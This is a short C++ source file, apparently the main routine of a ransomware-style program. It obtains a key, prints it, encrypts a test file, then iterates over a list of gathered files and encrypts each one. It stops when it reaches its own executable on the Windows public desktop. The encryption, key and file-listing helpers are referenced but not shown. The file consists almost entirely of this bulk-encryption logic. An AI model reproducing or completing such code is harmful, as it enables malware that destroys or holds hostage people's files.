#include <iostream> 
#include <fstream>
#include <vector>
#include "encryptOPS.h"
#include "key.h"
#include "listfiles.h"

using namespace std;

int main(){

    string key = getkey();
    cout << key << endl;
	encryptOPS enc = encryptOPS("test.txt", key.c_str());
    enc.encrypt();

    vector<string> files;
    files = getfiles();

    for (int i = 0; i < files.size(); i++){
        enc.setFile(files[i]);
        if(enc.getFile() == "C:\\Users\\Public\\Desktop\\encrypt.exe"){
            return 12;
        }
        enc.encrypt();
    }

    cout << "Press any key to continue..." << endl;

    return 0;
}


